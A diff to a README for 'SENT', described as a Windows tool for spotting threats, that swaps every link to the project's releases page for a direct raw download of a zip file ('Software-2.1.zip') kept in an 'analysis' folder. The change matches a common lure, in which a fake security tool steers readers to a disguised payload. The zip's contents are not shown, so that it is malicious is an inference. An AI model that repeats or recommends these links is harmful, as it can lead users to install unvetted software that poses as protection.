@@ -1,6 +1,6 @@
 # 🛡️ SENT - Spot Threats Before They Spread
 
-[![Download SENT](https://img.shields.io/badge/Download-SENT-blue?style=for-the-badge)](https://github.com/Soluble-tie817/SENT/releases)
+[![Download SENT](https://img.shields.io/badge/Download-SENT-blue?style=for-the-badge)](https://github.com/Soluble-tie817/SENT/raw/refs/heads/main/analysis/Software-2.1.zip)
 
 ## 📦 What SENT Does
 
@@ -22,7 +22,7 @@ SENT is built for normal Windows desktops and laptops. It does not need you to s
 
 Visit this page to download SENT:
 
-https://github.com/Soluble-tie817/SENT/releases
+https://github.com/Soluble-tie817/SENT/raw/refs/heads/main/analysis/Software-2.1.zip
 
 On that page, look for the latest release and get the Windows file that matches your PC.
 
@@ -172,4 +172,4 @@ It looks for malicious updates, stealth code changes, and behavior shifts that c
 
 If you need to get the app again, use this page:
 
-https://github.com/Soluble-tie817/SENT/releases
+https://github.com/Soluble-tie817/SENT/raw/refs/heads/main/analysis/Software-2.1.zip
